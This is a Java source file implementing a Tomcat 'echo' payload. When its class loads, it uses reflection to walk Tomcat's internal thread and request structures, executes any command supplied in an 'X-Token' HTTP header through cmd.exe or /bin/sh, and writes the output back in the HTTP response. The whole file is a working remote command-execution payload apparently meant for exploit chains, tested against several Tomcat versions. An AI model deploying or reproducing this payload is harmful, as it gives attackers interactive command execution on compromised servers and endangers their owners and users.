package com.demo.echo;

import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 *
 * use https://github.com/c0ny1/java-object-searcher
 * TargetObject = {org.apache.tomcat.util.threads.TaskThread}
 * ---> group = {java.lang.ThreadGroup}
 * ---> threads = {class [Ljava.lang.Thread;}
 * ---> [13] = {java.lang.Thread}
 * ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
 * ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
 * ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
 * ---> global = {org.apache.coyote.RequestGroupInfo}
 *
 * Version test
 * 6.0.53
 * 7.0.59、7.0.109
 * 8.0.53、8.5.82
 * 9.0.65
 */
public class TomcatEcho {
    static {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field field = threadGroup.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(threadGroup);

            boolean isEcho = false;

            for (int i = 0; i < threads.length; i++) {
                if (isEcho) break;

                // Thread 筛选
                Thread thread = threads[i];
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;

                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    if (isEcho) break;

                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    Object response = req.getClass().getMethod("getResponse").invoke(req);
                    String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "X-Token");
                    if (header != null && !header.isEmpty()) {
                        String[] cmd = null;
                        String os = System.getProperty("os.name").toLowerCase();
                        if (os.contains("win")) {
                            cmd = new String[]{"cmd.exe", "/c", header};
                        } else {
                            cmd = new String[]{"/bin/sh", "-c", header};
                        }
                        String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        // doWrite
                        response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                        try {
                            response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
                        } catch (NoSuchMethodException e) {
                            Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            Object byteChunk = clazz.newInstance();
                            clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
                            response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
                        }

                        isEcho = true;
                    }
                }

            }
        } catch (Exception e) {
            // 测试

        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
